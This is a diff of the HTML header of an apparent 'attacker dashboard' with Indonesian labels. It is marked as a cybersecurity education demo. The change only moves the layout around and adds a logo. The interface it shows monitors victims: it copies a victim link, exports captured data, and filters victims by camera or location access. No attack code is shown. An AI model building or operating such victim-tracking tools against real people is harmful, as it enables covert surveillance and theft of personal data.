@@ -246,28 +246,36 @@
 </head>
 <body>
     <div class="header">
-        <h1>🔥 DEMO CYBERSECURITY - ATTACKER DASHBOARD</h1>
-        <p>Real-time victim monitoring | <span id="connection-status">🟢 Terhubung</span></p>
-        <div class="alert">
-            ⚠️ DEMO MODE - HANYA UNTUK EDUKASI KEAMANAN SIBER ⚠️
-        </div>
-        
-        <div class="controls">
-            <input type="text" id="searchInput" class="search-box" placeholder="Cari victim ID atau IP..." onkeyup="filterVictims()">
-            <button onclick="copyLink()">📋 Copy Link Korban</button>
-            <button onclick="exportData()">💾 Export Data (JSON)</button>
-            <button onclick="exportCSV()">📊 Export CSV</button>
-            <button class="danger" onclick="clearData()">🗑️ Clear All Data</button>
-            <button onclick="refreshData()">🔄 Refresh</button>
-        </div>
-        
-        <div class="filter-buttons" id="filterButtons">
-            <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">Semua</button>
-            <button class="filter-btn" data-filter="camera" onclick="setFilter('camera')">Dengan Kamera</button>
-            <button class="filter-btn" data-filter="location" onclick="setFilter('location')">Dengan Lokasi</button>
-            <button class="filter-btn" data-filter="today" onclick="setFilter('today')">Hari Ini</button>
+    <div style="display:flex; align-items:center; gap:15px;">
+        <img src="img/mcs.jpg" alt="logo" style="width:60px; height:60px; border-radius:10px; object-fit:cover;">
+        <div>
+            <h1 style="margin:0;">DEMO CYBERSECURITY</h1>
+            <p style="margin:0; font-size:14px; color:#94a3b8;">ATTACKER DASHBOARD</p>
         </div>
     </div>
+
+    <p>Real-time victim monitoring | <span id="connection-status">🟢 Terhubung</span></p>
+
+    <div class="alert">
+        ⚠️ DEMO MODE - HANYA UNTUK EDUKASI KEAMANAN SIBER ⚠️
+    </div>
+    
+    <div class="controls">
+        <input type="text" id="searchInput" class="search-box" placeholder="Cari victim ID atau IP..." onkeyup="filterVictims()">
+        <button onclick="copyLink()">📋 Copy Link Korban</button>
+        <button onclick="exportData()">💾 Export Data (JSON)</button>
+        <button onclick="exportCSV()">📊 Export CSV</button>
+        <button class="danger" onclick="clearData()">🗑️ Clear All Data</button>
+        <button onclick="refreshData()">🔄 Refresh</button>
+    </div>
+    
+    <div class="filter-buttons" id="filterButtons">
+        <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">Semua</button>
+        <button class="filter-btn" data-filter="camera" onclick="setFilter('camera')">Dengan Kamera</button>
+        <button class="filter-btn" data-filter="location" onclick="setFilter('location')">Dengan Lokasi</button>
+        <button class="filter-btn" data-filter="today" onclick="setFilter('today')">Hari Ini</button>
+    </div>
+</div>
 
     <div class="stats">
         <div class="stat-card">
